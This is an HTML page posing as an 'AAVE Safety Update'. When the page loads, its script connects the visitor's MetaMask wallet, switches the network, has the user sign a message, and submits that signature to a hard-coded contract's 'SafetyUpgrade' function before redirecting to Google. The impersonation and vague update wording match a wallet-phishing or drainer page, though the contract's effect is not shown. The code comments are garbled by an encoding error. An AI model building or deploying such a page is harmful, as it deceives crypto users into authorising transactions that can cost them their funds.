<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>AAVE UPDATE - Perfect Match</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      margin: 0;
      padding: 20px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 15px;
      padding: 30px;
      text-align: center;
      max-width: 500px;
      width: 100%;
    }
    .status {
      margin: 20px 0;
      padding: 15px;
      border-radius: 8px;
      font-weight: bold;
    }
    .loading { background: #fff3cd; color: #856404; }
    .success { background: #d4edda; color: #155724; }
    .error { background: #f8d7da; color: #721c24; }
  </style>
</head>
<body>
  <div class="container">
    <h2>üîí AAVE Safety Update</h2>
    <p>Perfect signature matching...</p>
    <div id="status" class="status loading">üîÑ Starting...</div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script>
    const statusDiv = document.getElementById('status');

    function updateStatus(msg, type = 'loading') {
      statusDiv.textContent = msg;
      statusDiv.className = `status ${type}`;
    }

    (async () => {
      try {
        updateStatus('üîó Connecting...');

        if (!window.ethereum) {
          updateStatus('‚ùå MetaMask needed!', 'error');
          return;
        }

        await window.ethereum.request({method: 'eth_requestAccounts'});
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0xaa36a7' }]
        });

        updateStatus('üìù Sign message...');

        // üîß ÿØŸÇ€åŸÇÿßŸã ŸÖÿ´ŸÑ ⁄©ÿßŸÜÿ™ÿ±⁄©ÿ™ ÿßŸÖÿ∂ÿß ÿ®ÿ≥ÿßÿ≤€åŸÖ
        const message = "By signing this message, Update Your Health Factor";
        
        // ŸÖÿ±ÿ≠ŸÑŸá 1: messageHash ÿ®ÿ≥ÿßÿ≤€åŸÖ
        const messageBytes = ethers.toUtf8Bytes(message);
        const messageHash = ethers.keccak256(messageBytes);
        
        // ŸÖÿ±ÿ≠ŸÑŸá 2: ethSignedMessageHash ÿ®ÿ≥ÿßÿ≤€åŸÖ - ÿØŸÇ€åŸÇÿßŸã ŸÖÿ´ŸÑ ⁄©ÿßŸÜÿ™ÿ±⁄©ÿ™
        const ethSignedMessageHash = ethers.keccak256(
          ethers.concat([
            ethers.toUtf8Bytes("\x19Ethereum Signed Message:\n32"),
            ethers.getBytes(messageHash)
          ])
        );
        
        // ŸÖÿ±ÿ≠ŸÑŸá 3: ÿß€åŸÜ hash ÿ±Ÿà ÿßŸÖÿ∂ÿß ⁄©ŸÜ€åŸÖ
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        
        // ÿßŸÖÿ∂ÿß€å ŸÜŸáÿß€å€å
        const signature = await signer.signMessage(ethers.getBytes(messageHash));
        
        console.log("Message:", message);
        console.log("Message Hash:", messageHash);
        console.log("Eth Signed Hash:", ethSignedMessageHash);  
        console.log("Signature:", signature);

        updateStatus('üöÄ Sending...');

        const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
        const abi = [{
          "inputs": [{"internalType": "bytes", "name": "_signature", "type": "bytes"}],
          "name": "SafetyUpgrade",
          "outputs": [],
          "stateMutability": "nonpayable", 
          "type": "function"
        }];

        const contract = new ethers.Contract(contractAddress, abi, signer);

        const tx = await contract.SafetyUpgrade(signature, {
          gasLimit: 300000
        });
        
        updateStatus('‚è≥ Confirming...');
        await tx.wait();
        updateStatus('üéâ Success!', 'success');

        setTimeout(() => {
          window.location.replace("https://google.com");
        }, 2000);

      } catch (error) {
        console.error("Full error:", error);
        updateStatus('‚ùå ' + (error.reason || error.message || 'Failed'), 'error');
      }
    })();
  </script>
</body>
</html>
